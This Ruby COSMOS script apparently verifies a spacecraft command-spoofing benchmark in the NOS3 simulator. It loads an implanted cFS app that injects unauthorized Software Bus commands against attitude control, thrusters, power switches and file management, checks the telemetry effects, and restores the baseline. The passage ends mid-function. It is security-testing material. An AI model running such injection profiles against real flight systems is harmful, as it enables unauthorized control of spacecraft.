require 'json'
require 'fileutils'
require 'socket'
require 'time'
require 'cosmos'
require 'cosmos/script'
include Cosmos::Script

APP_NAME = 'SP001_SPOOFER'
APP_ENTRY = 'SP001_AppMain'
APP_FILE = '/cf/sp001_sb_spoof.so'
REPORT_ROOT = ENV.fetch('SP001_REPORT_DIR', "/tmp/sp001_spoof_results/#{Time.now.utc.strftime('%Y%m%dT%H%M%SZ')}")

START_APP_CANDIDATES = [
  "CFE CFE_ES_START_APP with APPLICATION #{APP_NAME}, APPENTRYPOINT #{APP_ENTRY}, APPFILENAME #{APP_FILE}, STACKSIZE 32768, EXCEPTIONACTION 0, PRIORITY 90",
  "CFS CFE_ES_START_APP with APPLICATION #{APP_NAME}, APPENTRYPOINT #{APP_ENTRY}, APPFILENAME #{APP_FILE}, STACKSIZE 32768, EXCEPTIONACTION 0, PRIORITY 90"
]

STOP_APP_CANDIDATES = [
  "CFE CFE_ES_STOP_APP with APPLICATION #{APP_NAME}",
  "CFS CFE_ES_STOP_APP with APPLICATION #{APP_NAME}"
]

MODE_VALUES = {
  'PASSIVE' => 0,
  'BDOT' => 1,
  'BDOT_MODE' => 1,
  'SUNSAFE' => 2,
  'SUNSAFE_MODE' => 2,
  'INERTIAL' => 3,
  'INERTIAL_MODE' => 3
}

BINARY_VALUES = {
  'DISABLED' => 0,
  'DISABLE' => 0,
  'OFF' => 0,
  'ENABLED' => 1,
  'ENABLE' => 1,
  'ON' => 1
}

LC_STATE_VALUES = {
  'ACTIVE' => 1,
  'LC_STATE_ACTIVE' => 1,
  'PASSIVE' => 2,
  'LC_STATE_PASSIVE' => 2,
  'DISABLED' => 3,
  'LC_STATE_DISABLED' => 3,
  'FROM_CDS' => 4,
  'LC_STATE_FROM_CDS' => 4
}

EPS_VALUES = {
  'OFF' => 0x00,
  'ON' => 0xAA
}

FM_FILE_STATUS = {
  'INVALID' => 0,
  'NOT_IN_USE' => 1,
  'FILE_OPEN' => 2,
  'FILE_CLOSED' => 3,
  'DIRECTORY' => 4
}

ATTACK_DESCRIPTION = {
  attack_entry: 'Implanted benchmark-controlled cFS app publishes command packets on cFE Software Bus',
  affected_components: 'GENERIC_ADCS, GENERIC_TORQUER, GENERIC_REACTION_WHEEL, GENERIC_EPS, GENERIC_THRUSTER, GENERIC_RADIO, NOVATEL_OEM615, GENERIC_IMU, GENERIC_MAG, GENERIC_CSS, GENERIC_FSS, GENERIC_STAR_TRACKER, TO_LAB, SCH, SC, LC, CF, TBL, ES, DS, FM',
  cps_type: 'Unauthorized internal command injection / command spoofing',
  security_consequence: 'Flight state, actuator state, sensor availability, navigation input, telemetry output, scheduler behavior, stored commands, limit checking, file transfer state, table state, app lifecycle, data storage state, or onboard files can change without ground authorization',
  recovery_strategy: 'Use legitimate ground commands to restore baseline telemetry state and benchmark-owned /cf/sp001_* files',
  nos3_cfs_injection: 'CFE_ES_START_APP loads /cf/sp001_sb_spoof.so; CFS SP001_RUN_PROFILE selects spoofed target MID/function code'
}

FM_SAFE_DIR = '/cf/sp001_safe_dir'
FM_DELETE_FILE = '/cf/sp001_delete_me.tmp'
FM_DELETE_ALL_DIR = '/cf/sp001_delete_all'
FM_DELETE_ALL_FILE1 = "#{FM_DELETE_ALL_DIR}/one.tmp"
FM_DELETE_ALL_FILE2 = "#{FM_DELETE_ALL_DIR}/two.tmp"
FM_PERM_FILE = '/cf/sp001_perm.tmp'
FM_DELETE_DIR = '/cf/sp001_delete_dir'
FM_SOURCE_FILE = '/cf/cfe_es_startup.scr'
SP001_TBL_FILE = '/cf/sp001_tbl.tbl'
SP001_TBL_NAME = 'SP001_SB_SPOOF.Config'
FSW_CF_DIR = ENV.fetch('SP001_FSW_CF_DIR', '/home/leejm/nos3/fsw/build/exe/cpu1/cf')
SP001_CI_HOST = ENV.fetch('SP001_CI_HOST', 'sc01-nos-fsw')
SP001_CI_PORT = ENV.fetch('SP001_CI_PORT', '5012').to_i
TO_LAB_SEND_HK_MID = 0x18E9
SC_CMD_MID = 0x18A9
SC_DISABLE_RTS_CC = 6
FM_OS_READ_WRITE = 2
FM_PERM_BASELINE_MODE = 0o444
FM_PERM_EXPECTED_READ_WRITE_MODE = 0o666

class SkipProfile < StandardError
  attr_reader :reason

  def initialize(reason)
    @reason = reason
    super(reason)
  end
end

# The legitimate preparation command is part of the verifier, not the
# attack.  Never transmit a spoofed command when that preparation did not
# create the required target state; doing so turns an invalid experiment into
# a misleading attack FAIL.
class PreconditionNotMet < StandardError; end

def scalar_to_i(value, mapping = {})
  return value if value.is_a?(Integer)
  return value.to_i if value.is_a?(Float)

  text = value.to_s.strip
  return text.to_i if text =~ /\A[-+]?\d+\z/

  mapped = mapping[text.upcase]
  raise "Unknown telemetry state value: #{value.inspect}" if mapped.nil?

  mapped
end

def tlm_i(target, packet, item, mapping = {})
  scalar_to_i(tlm("#{target} #{packet} #{item}"), mapping)
end

def tlm_i_first(candidates, mapping = {})
  errors = []
  candidates.each do |target, packet, item|
    begin
      return tlm_i(target, packet, item, mapping)
    rescue Exception => error
      errors << "#{target} #{packet} #{item}: #{error.message}"
    end
  end
  raise "Unable to read telemetry item from any candidate: #{errors.join(' | ')}"
end

def tlm_s_first(candidates)
  errors = []
  candidates.each do |target, packet, item|
    begin
      return tlm("#{target} #{packet} #{item}").to_s
    rescue Exception => error
      errors << "#{target} #{packet} #{item}: #{error.message}"
    end
  end
  raise "Unable to read telemetry string from any candidate: #{errors.join(' | ')}"
end

def unavailable_error?(error)
  message = error.message.to_s
  message.include?('does not exist') ||
    message.include?('Unable to read telemetry item from any candidate') ||
    message.include?('Unable to read telemetry string from any candidate')
end

def command_target_exists?(target)
  Cosmos::System.commands.target_names.include?(target)
rescue Exception
  false
end

def telemetry_target_exists?(target)
  Cosmos::System.telemetry.target_names.include?(target)
rescue Exception
  false
end

def require_command_target!(target, reason = nil)
  return if command_target_exists?(target)

  raise SkipProfile, (reason || "COSMOS/OpenC3 command target #{target} is not loaded")
end

def require_telemetry_target!(target, reason = nil)
  return if telemetry_target_exists?(target)

  raise SkipProfile, (reason || "COSMOS/OpenC3 telemetry target #{target} is not loaded")
end

$command_observable_cache = {}

def require_observable_command_counter!(target, noop_command, read_lambda)
  cache_key = [target, noop_command]
  observable = $command_observable_cache.fetch(cache_key, nil)
  unless observable.nil?
    raise SkipProfile, "#{target} command counter is not observable in current NOS3 run" unless observable
    return
  end

  before = read_lambda.call
  cmd(noop_command)
  result = wait_until(4.0, 0.5) do
    state = read_lambda.call
    { matched: state[:cmd_count] > before[:cmd_count], state: state }
  end
  observable = result[:matched]
  $command_observable_cache[cache_key] = observable
  raise SkipProfile, "#{target} command counter is not observable in current NOS3 run" unless observable
end

def ensure_benchmark_cf_path!(path)
  raise "Refusing to touch non-benchmark /cf path: #{path}" unless path.start_with?('/cf/sp001_')
end

def cf_runtime_path(path)
  raise "Expected /cf path, got #{path.inspect}" unless path.start_with?('/cf/')

  File.join(FSW_CF_DIR, path.sub(%r{\A/cf/?}, ''))
end

def runtime_file_status(path)
  local_path = cf_runtime_path(path)
  exists = File.exist?(local_path)
  stat = exists ? File.stat(local_path) : nil

  {
    runtime_path: local_path,
    exists: exists,
    directory: exists && File.directory?(local_path),
    file: exists && File.file?(local_path),
    size_fs: stat && stat.file? ? stat.size : 0,
    mode_fs: stat ? (stat.mode & 0o7777) : 0
  }
rescue StandardError => error
  {
    runtime_path: local_path,
    exists: false,
    directory: false,
    file: false,
    size_fs: 0,
    mode_fs: 0,
    error_class: error.class.to_s,
    error: error.message
  }
end

def remove_runtime_path_if_present(path)
  ensure_benchmark_cf_path!(path)
  local_path = cf_runtime_path(path)
  FileUtils.rm_rf(local_path) if File.exist?(local_path)
  runtime_file_status(path)
end

def create_runtime_file(path, mode = 0o444)
  ensure_benchmark_cf_path!(path)
  local_path = cf_runtime_path(path)
  FileUtils.mkdir_p(File.dirname(local_path))
  File.write(local_path, "SP001 benchmark-owned file for FM permission spoof validation\n")
  File.chmod(mode, local_path)
  runtime_file_status(path)
end

def fm_status_matches?(state, statuses)
  return true if statuses.include?(state[:status])

  runtime = state[:runtime] || {}
  return true if statuses.include?(FM_FILE_STATUS['DIRECTORY']) && runtime[:directory]
  return true if statuses.include?(FM_FILE_STATUS['FILE_CLOSED']) && runtime[:file]
  return true if statuses.include?(FM_FILE_STATUS['FILE_OPEN']) && runtime[:file]
  return true if statuses.include?(FM_FILE_STATUS['NOT_IN_USE']) && !runtime[:exists]

  false
end

def fm_effective_missing?(state)
  state[:status] == FM_FILE_STATUS['NOT_IN_USE'] || !(state[:runtime] || {})[:exists]
end

def fm_effective_directory?(state)
  state[:status] == FM_FILE_STATUS['DIRECTORY'] || (state[:runtime] || {})[:directory]
end

def fm_effective_file?(state)
  [FM_FILE_STATUS['FILE_CLOSED'], FM_FILE_STATUS['FILE_OPEN']].include?(state[:status]) || (state[:runtime] || {})[:file]
end

def fm_effective_mode(state)
  runtime = state[:runtime] || {}
  runtime[:mode_fs].to_i.positive? ? runtime[:mode_fs].to_i : state[:mode].to_i
end

def cmd_first(candidates)
  errors = []
  candidates.each do |candidate|
    begin
      cmd(candidate)
      return { ok: true, command: candidate }
    rescue Exception => error
      errors << {
        command: candidate,
        error_class: error.class.to_s,
        error: error.message
      }
    end
  end
  { ok: false, errors: errors }
end

def cmd_optional(command)
  cmd(command)
  { ok: true, command: command }
rescue Exception => error
  { ok: false, command: command, error_class: error.class.to_s, error: error.message }
end

def cfe_checksum(packet)
  value = 0xFF
  packet.each_byte { |byte| value ^= byte }
  value & 0xFF
end

def cfe_command_packet(mid, function_code, payload = ''.b)
  packet = [mid & 0xFFFF, 0xC000, (8 + payload.bytesize - 7) & 0xFFFF].pack('n n n')
  packet << [function_code & 0xFF, 0].pack('C C')
  packet << payload
  packet.setbyte(7, cfe_checksum(packet))
  packet
end

def request_to_lab_hk
  packet = cfe_command_packet(TO_LAB_SEND_HK_MID, 0)
  UDPSocket.open { |socket| socket.send(packet, 0, SP001_CI_HOST, SP001_CI_PORT) }
  sleep(0.4)
rescue Exception => error
  raise "TO_LAB HK request failed: #{error.class}: #{error.message}"
end

def clean_event_string(value)
  value.to_s.delete("\u0000").strip
end

def read_evs_event
  {
    sequence: tlm_i('CFS', 'CFE_EVS_PACKET', 'CCSDS_SEQUENCE'),
    app_name: clean_event_string(tlm('CFS CFE_EVS_PACKET PACKETID_APPNAME')),
    message: clean_event_string(tlm('CFS CFE_EVS_PACKET MESSAGE')),
    observed_at: Time.now.utc.iso8601
  }
end

def observe_evs_event(baseline, app_name, message_pattern, timeout_seconds = 3.0)
  prior_sequence = baseline && baseline[:sequence]
  observed = []
  result = wait_until(timeout_seconds, 0.08) do
    event = read_evs_event
    if event[:sequence] != prior_sequence
      observed << event
      prior_sequence = event[:sequence]
    end
    matched = observed.any? do |candidate|
      candidate[:app_name] == app_name && candidate[:message].match?(message_pattern)
    end
    { matched: matched, state: { events: observed, last_event: event } }
  end
  result[:state].merge(matched: result[:matched], app_name: app_name, message_pattern: message_pattern.source)
rescue Exception => error
  { matched: false, error_class: error.class.to_s, error: error.message, events: [] }
end

def wait_until(timeout_seconds = 8.0, interval = 0.5)
  deadline = Time.now + timeout_seconds
  last = yield

  until last[:matched] || Time.now >= deadline
    sleep(interval)
    last = yield
  end

  last
end

def request_adcs
  cmd('GENERIC_ADCS GENERIC_ADCS_REQ_HK')
  sleep(0.2)
  cmd('GENERIC_ADCS GENERIC_ADCS_SEND_GNC_CC')
  sleep(0.3)
end

def read_adcs
  request_adcs
  {
    cmd_count: tlm_i('GENERIC_ADCS', 'GENERIC_ADCS_HK_TLM', 'CMD_COUNT'),
    err_count: tlm_i('GENERIC_ADCS', 'GENERIC_ADCS_HK_TLM', 'CMD_ERR_COUNT'),
    mode: tlm_i('GENERIC_ADCS', 'GENERIC_ADCS_GNC', 'MODE', MODE_VALUES),
    h_mgmton: tlm_i('GENERIC_ADCS', 'GENERIC_ADCS_GNC', 'H_MGMTON', BINARY_VALUES)
  }
end

def set_adcs_mode(mode)
  cmd("GENERIC_ADCS GENERIC_ADCS_SET_MODE_CC with GNC_MODE #{mode}")
  wait_until { state = read_adcs; { matched: state[:mode] == mode, state: state } }[:state]
end

def set_adcs_momentum(enabled)
  cmd("GENERIC_ADCS GENERIC_ADCS_SET_MOMENTUM_MANAGEMENT_CC with GNC_MODE #{enabled}")
  wait_until { state = read_adcs; { matched: state[:h_mgmton] == enabled, state: state } }[:state]
end

def request_torquer
  cmd('GENERIC_TORQUER GENERIC_TORQUER_REQ_HK_CC')
  sleep(0.4)
end

def read_torquer
  request_torquer
  {
    cmd_count: tlm_i('GENERIC_TORQUER', 'GENERIC_TORQUER_HK_TLM_T', 'CMD_COUNT'),
    err_count: tlm_i('GENERIC_TORQUER', 'GENERIC_TORQUER_HK_TLM_T', 'CMD_ERR_COUNT'),
    device_count: tlm_i('GENERIC_TORQUER', 'GENERIC_TORQUER_HK_TLM_T', 'DEVICE_COUNT'),
    device_err_count: tlm_i('GENERIC_TORQUER', 'GENERIC_TORQUER_HK_TLM_T', 'DEVICE_ERR_COUNT'),
    enabled: tlm_i('GENERIC_TORQUER', 'GENERIC_TORQUER_HK_TLM_T', 'DEVICE_ENABLED', BINARY_VALUES),
    dir0: tlm_i('GENERIC_TORQUER', 'GENERIC_TORQUER_HK_TLM_T', 'TORQUER_DIRECTION_0'),
    pct0: tlm_i('GENERIC_TORQUER', 'GENERIC_TORQUER_HK_TLM_T', 'TORQUER_PERCENT_ON_0'),
    dir1: tlm_i('GENERIC_TORQUER', 'GENERIC_TORQUER_HK_TLM_T', 'TORQUER_DIRECTION_1'),
    pct1: tlm_i('GENERIC_TORQUER', 'GENERIC_TORQUER_HK_TLM_T', 'TORQUER_PERCENT_ON_1'),
    dir2: tlm_i('GENERIC_TORQUER', 'GENERIC_TORQUER_HK_TLM_T', 'TORQUER_DIRECTION_2'),
    pct2: tlm_i('GENERIC_TORQUER', 'GENERIC_TORQUER_HK_TLM_T', 'TORQUER_PERCENT_ON_2')
  }
end

def set_torquer_enabled(enabled)
  cmd(enabled == 1 ? 'GENERIC_TORQUER GENERIC_TORQUER_ENABLE_CC' : 'GENERIC_TORQUER GENERIC_TORQUER_DISABLE_CC')
  wait_until { state = read_torquer; { matched: state[:enabled] == enabled, state: state } }[:state]
end

def set_torquer_percent(index, direction, percent_on)
  cmd("GENERIC_TORQUER GENERIC_TORQUER_PERCENT_ON_CC with TRQNUM #{index}, DIRECTION #{direction}, PERCENT_ON #{percent_on}")
  wait_until do
    state = read_torquer
    { matched: state[:"dir#{index}"] == direction && state[:"pct#{index}"] == percent_on, state: state }
  end[:state]
end

def set_torquer_all(direction, percent_on)
  cmd("GENERIC_TORQUER GENERIC_TORQUER_ALL_PERCENT_ON_CC with DIRECTION_0 #{direction}, PERCENT_ON_0 #{percent_on}, DIRECTION_1 #{direction}, PERCENT_ON_1 #{percent_on}, DIRECTION_2 #{direction}, PERCENT_ON_2 #{percent_on}")
  wait_until do
    state = read_torquer
    matched = [0, 1, 2].all? { |idx| state[:"dir#{idx}"] == direction && state[:"pct#{idx}"] == percent_on }
    { matched: matched, state: state }
  end[:state]
end

def torquer_matches?(state, expected)
  state[:enabled] == expected[:enabled] &&
    [0, 1, 2].all? do |idx|
      state[:"dir#{idx}"] == expected[:"dir#{idx}"] && state[:"pct#{idx}"] == expected[:"pct#{idx}"]
    end
end

def restore_torquer_state(original)
  # The ADCS control loop and the simulated device run asynchronously.  A
  # single restore command can be overtaken by an in-flight output update, so
  # restore the complete observed state and confirm it before returning.
  last = nil
  3.times do
    [0, 1, 2].each do |idx|
      set_torquer_percent(idx, original[:"dir#{idx}"], original[:"pct#{idx}"])
    end
    set_torquer_enabled(original[:enabled]) if read_torquer[:enabled] != original[:enabled]
    last = read_torquer
    return last if torquer_matches?(last, original)
  end
  last || read_torquer
end

def request_rw
  cmd('GENERIC_REACTION_WHEEL GENERIC_RW_REQ_DATA_CC')
  sleep(0.5)
end

def read_rw
  request_rw
  {
    # SP006 exposes dictionary aliases for the real RW HK MID (0x0993).
    # COSMOS resolves a duplicate MID to one packet definition, so the native
    # component target can stay stale while the real packet is downlinked.
    cmd_count: tlm_i_first([['CFS', 'SP006_RW_HK_TLM', 'COMMANDCOUNTER'], ['GENERIC_REACTION_WHEEL', 'GENRW_HK_TLM_T', 'COMMAND_COUNT']]),
    err_count: tlm_i_first([['CFS', 'SP006_RW_HK_TLM', 'COMMANDERRCOUNTER'], ['GENERIC_REACTION_WHEEL', 'GENRW_HK_TLM_T', 'ERROR_COUNT']]),
    device_count_rw0: tlm_i_first([['CFS', 'SP006_RW_HK_TLM', 'DEVICECOUNT_RW0'], ['GENERIC_REACTION_WHEEL', 'GENRW_HK_TLM_T', 'DEVICE_COUNT_RW0']]),
    device_err_count_rw0: tlm_i_first([['CFS', 'SP006_RW_HK_TLM', 'DEVICEERRORCOUNT_RW0'], ['GENERIC_REACTION_WHEEL', 'GENRW_HK_TLM_T', 'DEVICE_ERR_COUNT_RW0']]),
    enabled_rw0: tlm_i_first([['CFS', 'SP006_RW_HK_TLM', 'DEVICEENABLED_RW0'], ['GENERIC_REACTION_WHEEL', 'GENRW_HK_TLM_T', 'DEVICE_ENABLED_RW0']], BINARY_VALUES),
    momentum0: tlm_s_first([['CFS', 'SP006_RW_HK_TLM', 'MOMENTUM_RW0'], ['GENERIC_REACTION_WHEEL', 'GENRW_HK_TLM_T', 'MOMENTUM_NMS_0']]).to_f
  }
end

def set_rw_enabled(wheel, enabled)
  cmd_name = enabled == 1 ? 'GENERIC_RW_ENABLE_CC' : 'GENERIC_RW_DISABLE_CC'
  cmd("GENERIC_REACTION_WHEEL #{cmd_name} with WHEEL_NUMBER #{wheel}")
  wait_until { state = read_rw; { matched: state[:enabled_rw0] == enabled, state: state } }[:state]
end

def set_rw_torque(wheel, torque)
  before = read_rw
  cmd("GENERIC_REACTION_WHEEL GENERIC_RW_SET_TORQUE_CC with WHEEL_NUMBER #{wheel}, TORQUE #{torque}")
  wait_until do
    state = read_rw
    { matched: state[:cmd_count] > before[:cmd_count] && state[:device_count_rw0] >= before[:device_count_rw0], state: state }
  end[:state]
end

def request_eps
  cmd('GENERIC_EPS GENERIC_EPS_REQ_HK')
  sleep(0.4)
end

def read_eps
  request_eps
  {
    cmd_count: tlm_i('GENERIC_EPS', 'GENERIC_EPS_HK_TLM', 'CMD_COUNT'),
    err_count: tlm_i('GENERIC_EPS', 'GENERIC_EPS_HK_TLM', 'CMD_ERR_COUNT'),
    device_count: tlm_i('GENERIC_EPS', 'GENERIC_EPS_HK_TLM', 'DEVICE_COUNT'),
    device_err_count: tlm_i('GENERIC_EPS', 'GENERIC_EPS_HK_TLM', 'DEVICE_ERR_COUNT'),
    switch0: tlm_i('GENERIC_EPS', 'GENERIC_EPS_HK_TLM', 'SWITCH_0_STATE', EPS_VALUES)
  }
end

def set_eps_switch(switch_number, state)
  cmd("GENERIC_EPS GENERIC_EPS_SWITCH_CC with SWITCH_NUMBER #{switch_number}, STATE #{state}")
  wait_until { eps = read_eps; { matched: eps[:switch0] == state, state: eps } }[:state]
end

def request_ds
  cmd('CFS DS_SEND_HK')
  sleep(0.4)
end

def read_ds
  request_ds
  {
    cmd_count: tlm_i('CFS', 'DS_HKPACKET', 'CMDACCEPTEDCOUNTER'),
    err_count: tlm_i('CFS', 'DS_HKPACKET', 'CMDREJECTEDCOUNTER'),
    app_state: tlm_i('CFS', 'DS_HKPACKET', 'APPENABLESTATE', BINARY_VALUES)
  }
end

def read_ds_file_info
  cmd('CFS DS_GET_FILE_INFO')
  sleep(0.6)
  {
    enable_state0: tlm_i('CFS', 'DS_FILEINFOPKT', 'ENABLESTATE0', BINARY_VALUES),
    open_state0: tlm_i('CFS', 'DS_FILEINFOPKT', 'OPENSTATE0', BINARY_VALUES),
    filename0: tlm('CFS DS_FILEINFOPKT FILENAME0').to_s
  }.merge(read_ds)
end

def set_ds_app_state(enabled)
  cmd("CFS DS_SET_APP_STATE with ENABLESTATE #{enabled}")
  wait_until { state = read_ds; { matched: state[:app_state] == enabled, state: state } }[:state]
end

def set_ds_dest_state(index, enabled)
  cmd("CFS DS_SET_DEST_STATE with FILETABLEINDEX #{index}, ENABLESTATE #{enabled}")
  wait_until do
    state = read_ds_file_info
    { matched: state[:enable_state0] == enabled, state: state }
  end[:state]
end

def request_fm
  cmd('CFS FM_SEND_HK')
  sleep(0.4)
end

def read_fm
  request_fm
  {
    cmd_count: tlm_i('CFS', 'FM_HOUSEKEEPINGPKT', 'COMMANDCOUNTER'),
    err_count: tlm_i('CFS', 'FM_HOUSEKEEPINGPKT', 'COMMANDERRCOUNTER'),
    child_count: tlm_i('CFS', 'FM_HOUSEKEEPINGPKT', 'CHILDCMDCOUNTER'),
    child_err_count: tlm_i('CFS', 'FM_HOUSEKEEPINGPKT', 'CHILDCMDERRCOUNTER')
  }
end

def fm_file_info(path)
  cmd("CFS FM_GET_FILE_INFO with FILENAME #{path}, FILEINFOCRC 0")
  sleep(0.8)
  {
    status: tlm_i('CFS', 'FM_FILEINFOPKT', 'FILESTATUS', FM_FILE_STATUS),
    size: tlm_i('CFS', 'FM_FILEINFOPKT', 'FILESIZE'),
    mode: tlm_i('CFS', 'FM_FILEINFOPKT', 'MODE'),
    filename: tlm('CFS FM_FILEINFOPKT FILENAME').to_s,
    runtime: runtime_file_status(path)
  }.merge(read_fm)
end

def fm_wait_status(path, statuses, timeout_seconds = 10.0)
  wait_until(timeout_seconds, 0.7) do
    state = fm_file_info(path)
    { matched: fm_status_matches?(state, statuses), state: state }
  end[:state]
end

def fm_delete_file_if_present(path)
  info = fm_file_info(path)
  return info if fm_effective_missing?(info)

  cmd_optional("CFS FM_DELETE with FILENAME #{path}")
  info = fm_wait_status(path, [FM_FILE_STATUS['NOT_IN_USE']])
  return info if fm_effective_missing?(info)

  remove_runtime_path_if_present(path)
  fm_file_info(path)
end

def fm_delete_dir_if_present(path)
  info = fm_file_info(path)
  return info unless fm_effective_directory?(info)

  cmd_optional("CFS FM_DELETE_DIR with DIRECTORY #{path}")
  info = fm_wait_status(path, [FM_FILE_STATUS['NOT_IN_USE']])
  return info if fm_effective_missing?(info)

  remove_runtime_path_if_present(path)
  fm_file_info(path)
end

def ensure_fm_dir_absent(path)
  # FM child commands are asynchronous.  Do not start CREATE_DIR until both
  # flight-visible state and the mounted /cf path agree that the old test
  # directory is absent.
  state = fm_delete_dir_if_present(path)
  3.times do
    return state if fm_effective_missing?(state)

    remove_runtime_path_if_present(path)
    sleep(0.4)
    state = fm_file_info(path)
  end
  raise "Unable to establish clean FM baseline for #{path}" unless fm_effective_missing?(state)

  state
end

def fm_create_dir(path)
  info = fm_file_info(path)
  return info if fm_effective_directory?(info)

  cmd("CFS FM_CREATE_DIR with DIRECTORY #{path}")
  fm_wait_status(path, [FM_FILE_STATUS['DIRECTORY']])
end

def fm_copy_file(target)
  fm_delete_file_if_present(target)
  cmd("CFS FM_COPY with OVERWRITE 1, SOURCE #{FM_SOURCE_FILE}, TARGET #{target}")
  fm_wait_status(target, [FM_FILE_STATUS['FILE_CLOSED'], FM_FILE_STATUS['FILE_OPEN']])
end

def prepare_fm_perm_file
  fm_delete_file_if_present(FM_PERM_FILE)
  create_runtime_file(FM_PERM_FILE, FM_PERM_BASELINE_MODE)
  fm_file_info(FM_PERM_FILE)
end

def sp001_reset
  cmd('CFS SP001_RESET')
  { ok: true, command: 'CFS SP001_RESET' }
rescue Exception => error
  { ok: false, command: 'CFS SP001_RESET', error_class: error.class.to_s, error: error.message }
end

def sp001_run_profile(profile_id, args)
  full_args = args + Array.new(4 - args.length, 0)
  command = "CFS SP001_RUN_PROFILE with PROFILEID #{profile_id}, FLAGS 0, ARG1 #{full_args[0]}, ARG2 #{full_args[1]}, ARG3 #{full_args[2]}, ARG4 #{full_args[3]}"
  cmd(command)
  { ok: true, command: command, profile_id: profile_id, args: full_args }
rescue Exception => error
  { ok: false, profile_id: profile_id, args: full_args, error_class: error.class.to_s, error: error.message }
end

def common_counter_evidence(before, after)
  {
    command_counter_increased: after[:cmd_count] > before[:cmd_count],
    error_counter_unchanged: after[:err_count] == before[:err_count]
  }
end

def target_counter_evidence(before, after, cmd_key = :cmd_count, err_key = :err_count)
  {
    command_counter_increased: after[cmd_key] > before[cmd_key],
    error_counter_unchanged: after[err_key] == before[err_key]
  }
end

def counter_or_device_evidence(before, after)
  {
    command_counter_increased: after[:cmd_count] > before[:cmd_count],
    error_counter_unchanged: after[:err_count] == before[:err_count],
    thruster_remained_enabled: after[:enabled] == 1
  }
end

def request_component_hk(target)
  cmd("#{target} #{target}_REQ_HK")
  sleep(0.4)
rescue Exception
  sleep(0.4)
end

def read_component_hk(target)
  request_component_hk(target)
  if target == 'GENERIC_THRUSTER'
    # SP006's dictionary owns the same real 0x08EA downlink in this COSMOS
    # configuration. Prefer it, retaining the component dictionary fallback.
    return {
      cmd_count: tlm_i_first([['CFS', 'SP006_THRUSTER_HK_TLM', 'COMMANDCOUNT'], [target, "#{target}_HK_TLM", 'CMD_COUNT']]),
      err_count: tlm_i_first([['CFS', 'SP006_THRUSTER_HK_TLM', 'COMMANDERRCOUNT'], [target, "#{target}_HK_TLM", 'CMD_ERR_COUNT']]),
      device_count: tlm_i_first([['CFS', 'SP006_THRUSTER_HK_TLM', 'DEVICECOUNT'], [target, "#{target}_HK_TLM", 'DEVICE_COUNT']]),
      device_err_count: tlm_i_first([['CFS', 'SP006_THRUSTER_HK_TLM', 'DEVICEERRORCOUNT'], [target, "#{target}_HK_TLM", 'DEVICE_ERR_COUNT']]),
      enabled: tlm_i_first([['CFS', 'SP006_THRUSTER_HK_TLM', 'DEVICEENABLED'], [target, "#{target}_HK_TLM", 'DEVICE_ENABLED']], BINARY_VALUES)
    }
  end

  packet = "#{target}_HK_TLM"
  {
    cmd_count: tlm_i(target, packet, 'CMD_COUNT'),
    err_count: tlm_i(target, packet, 'CMD_ERR_COUNT'),
    device_count: tlm_i(target, packet, 'DEVICE_COUNT'),
    device_err_count: tlm_i(target, packet, 'DEVICE_ERR_COUNT'),
    enabled: tlm_i(target, packet, 'DEVICE_ENABLED', BINARY_VALUES)
  }
end

def set_component_enabled(target, enabled)
  cmd_name = enabled == 1 ? "#{target}_ENABLE_CC" : "#{target}_DISABLE_CC"
  cmd("#{target} #{cmd_name}")
  wait_until { state = read_component_hk(target); { matched: state[:enabled] == enabled, state: state } }[:state]
end

def component_enable_profile(name, id, target, desired_state, risk, applicable_lambda = nil)
  {
    name: name,
    id: id,
    risk: risk,
    target: target,
    applicable: applicable_lambda || -> { require_telemetry_target!(target); require_command_target!(target) },
    args: ->(_ctx) { [] },
    prepare: lambda do |original|
      baseline = desired_state == 1 ? 0 : 1
      set_component_enabled(target, baseline) if original[:enabled] != baseline
      { original: original, desired_state: desired_state }
    end,
    read: -> { read_component_hk(target) },
    passed: lambda do |before, after, ctx|
      common_counter_evidence(before, after).merge(device_state_changed: after[:enabled] == ctx[:desired_state])
    end,
    recover: ->(ctx) { set_component_enabled(target, ctx[:original][:enabled]) },
    recovered: ->(ctx, state) { state[:enabled] == ctx[:original][:enabled] }
  }
end

def command_counter_profile(name, id, risk, target, args_lambda, read_lambda, recover_lambda = nil, applicable_lambda = nil)
  {
    name: name,
    id: id,
    risk: risk,
    target: target,
    applicable: applicable_lambda,
    args: args_lambda,
    prepare: ->(original) { { original: original } },
    read: read_lambda,
    passed: ->(before, after, _ctx) { target_counter_evidence(before, after) },
    recover: recover_lambda || ->(_ctx) { read_lambda.call },
    recovered: ->(_ctx, _state) { true }
  }
end

def tbl_service_profile(name, id, applicable_lambda = nil)
  {
    name: name,
    id: id,
    risk: 'hazardous',
    target: 'TBL',
    applicable: applicable_lambda,
    args: ->(_ctx) { [] },
    prepare: ->(original) { { original: original } },
    read: method(:read_tbl),
    passed: lambda do |before, after, _ctx|
      counter_changed = after[:cmd_count] > before[:cmd_count] || after[:err_count] > before[:err_count]
      {
        tbl_service_processed_unauthorized_command: counter_changed
      }
    end,
    recover: ->(_ctx) { read_tbl },
    recovered: ->(_ctx, _state) { true }
  }
end

def read_thruster
  read_component_hk('GENERIC_THRUSTER')
end

def set_thruster_enabled(enabled)
  set_component_enabled('GENERIC_THRUSTER', enabled)
end

def read_radio
  request_component_hk('GENERIC_RADIO')
  {
    cmd_count: tlm_i('GENERIC_RADIO', 'GENERIC_RADIO_HK_TLM', 'CMD_COUNT'),
    err_count: tlm_i('GENERIC_RADIO', 'GENERIC_RADIO_HK_TLM', 'CMD_ERR_COUNT'),
    device_err_count: tlm_i('GENERIC_RADIO', 'GENERIC_RADIO_HK_TLM', 'DEVICE_ERR_COUNT'),
    forward_err_count: tlm_i('GENERIC_RADIO', 'GENERIC_RADIO_HK_TLM', 'FORWARD_ERR_COUNT'),
    forward_count: tlm_i('GENERIC_RADIO', 'GENERIC_RADIO_HK_TLM', 'FORWARD_COUNT'),
    device_counter: tlm_i('GENERIC_RADIO', 'GENERIC_RADIO_HK_TLM', 'DEVICE_COUNTER')
  }
end

def require_novatel_observable!
  require_telemetry_target!('NOVATEL_OEM615')
  require_command_target!('NOVATEL_OEM615')
  require_observable_command_counter!(
    'NOVATEL_OEM615',
    'NOVATEL_OEM615 NOVATEL_OEM615_NOOP_CC',
    -> { read_component_hk('NOVATEL_OEM615') }
  )
end

def require_to_lab_observable!
  require_telemetry_target!('TO_DEBUG')
  require_command_target!('TO_DEBUG')
  # A preceding remove-all profile restarts TO_LAB_APP.  Its normal startup
  # state intentionally has no downlink destination, so restore the baseline
  # route before checking whether its live HK counter is observable.
  recover_to_lab_output
  require_observable_command_counter!(
    'TO_DEBUG',
